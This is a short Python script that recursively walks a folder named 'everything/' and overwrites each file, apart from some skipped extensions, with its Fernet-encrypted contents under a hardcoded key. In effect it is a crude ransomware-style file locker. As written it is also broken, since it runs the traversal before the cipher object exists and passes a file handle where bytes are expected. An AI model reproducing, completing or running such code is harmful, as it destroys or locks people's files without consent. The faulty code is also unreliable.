from cryptography.fernet import Fernet
import os
import time
import shutil

nulls = ['pyc', 'pyd', 'exe', 'dll', 'zip', 'json', 'pem', 'typed', 'txt', 'mp3', 'egg', 'whl', 'Pipfile']
road = 'everything/'
files = os.listdir(road)
def iter(road):
    contains = False
    for filename in os.listdir(road):
        f = os.path.join(road, filename)
        if os.path.isdir(f):
            iter(f)
        elif os.path.isfile(f):
            for end in nulls:
                if end in f:
                    contains = True
                    break
                else:
                    contains = False
            if not contains:
                print(f'Encrypting: {f}')
                f2 = open(f, 'rb')
                encrypt = bob_marley.encrypt(f2)
                f2.close()
                f2 = open(f, 'wb')
                f2.write(encrypt)
                f2.close()


iter(road)
fornication = b'5VsQ04U13bSDhhbv8Uk9nFbPfPY1VGoVhkA87JDyYdA='
bob_marley = Fernet(fornication)